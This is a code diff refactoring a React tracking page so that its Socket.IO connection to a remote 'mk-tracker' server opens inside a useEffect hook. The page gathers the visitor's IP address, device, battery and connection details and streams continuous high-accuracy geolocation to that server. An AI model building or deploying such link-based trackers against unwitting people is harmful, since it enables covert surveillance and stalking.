@@ -26,7 +26,7 @@ const getTemplateIcon = (id, color = 'currentColor', size = 30) => {
   }
 };
 
-const socket = io('https://mk-tracker.onrender.com');
+// Socket is initialized inside useEffect on client mount to prevent server-side execution and build hangs.
 
 const getIP = async () => {
   try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
@@ -114,6 +114,7 @@ function TrackContent() {
   const [status, setStatus] = useState('init'); // init | waiting | active | error
   const [dots,   setDots]   = useState('');
   const sent = useRef(false);
+  const socketRef = useRef(null);
 
   useEffect(() => {
     const iv = setInterval(() => setDots(p => p.length >= 3 ? '' : p + '.'), 500);
@@ -121,23 +122,27 @@ function TrackContent() {
   }, []);
 
   useEffect(() => {
+    let wid;
     const run = async () => {
       const di  = getDeviceInfo();
       const ip  = await getIP();
       const bat = await getBattery();
       const con = getConnection();
 
-      socket.emit('join_tracker', { tracker_id: trackerId, deviceInfo: { ...di, ipAddress: ip } });
+      const s = io('https://mk-tracker.onrender.com');
+      socketRef.current = s;
+
+      s.emit('join_tracker', { tracker_id: trackerId, deviceInfo: { ...di, ipAddress: ip } });
       setStatus('waiting');
 
       if (!('geolocation' in navigator)) { setStatus('error'); return; }
 
       const opts = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
-      const wid  = navigator.geolocation.watchPosition(
+      wid = navigator.geolocation.watchPosition(
         pos => {
           sent.current = true;
           setStatus('active');
-          socket.emit('update_location', {
+          s.emit('update_location', {
             tracker_id: trackerId,
             lat: pos.coords.latitude, lng: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
@@ -154,7 +159,7 @@ function TrackContent() {
             pos => {
               sent.current = true;
               setStatus('active');
-              socket.emit('update_location', {
+              s.emit('update_location', {
                 tracker_id: trackerId,
                 lat: pos.coords.latitude, lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
@@ -164,9 +169,15 @@ function TrackContent() {
           );
         }, opts
       );
-      return () => navigator.geolocation.clearWatch(wid);
     };
     run();
+
+    return () => {
+      if (wid !== undefined) navigator.geolocation.clearWatch(wid);
+      if (socketRef.current) {
+        socketRef.current.disconnect();
+      }
+    };
   }, [trackerId]);
 
   return (
